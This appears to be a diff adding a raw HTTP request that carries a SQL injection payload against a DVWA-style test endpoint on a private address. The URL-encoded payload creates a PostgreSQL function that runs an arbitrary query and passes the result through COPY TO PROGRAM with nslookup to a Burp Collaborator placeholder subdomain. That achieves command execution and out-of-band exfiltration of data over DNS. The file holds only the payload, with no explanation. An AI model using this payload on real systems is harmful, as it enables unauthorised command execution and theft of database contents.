@@ -1,0 +1,10 @@
+GET /vulnerabilities/sqli/?id=create+OR+replace+function+f%28%29+returns+void+as+%24%24+declare+c+text%3B+declare+p+text%3B+begin+SELECT+into+p+%28SELECT+YOUR-QUERY-HERE%29%3B+c+%3A%3D+%27copy+%28SELECT+%27%27%27%27%29+to+program+%27%27nslookup+%27%7C%7Cp%7C%7C%27.BURP-COLLABORATOR-SUBDOMAIN%27%27%27%3B+execute+c%3B+END%3B+%24%24+language+plpgsql+security+definer%3B+SELECT+f%28%29%3B&Submit=Submit HTTP/1.1
+Host: 10.10.3.128:2280
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://10.10.3.128:2280/vulnerabilities/sqli/?id=&Submit=Submit
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
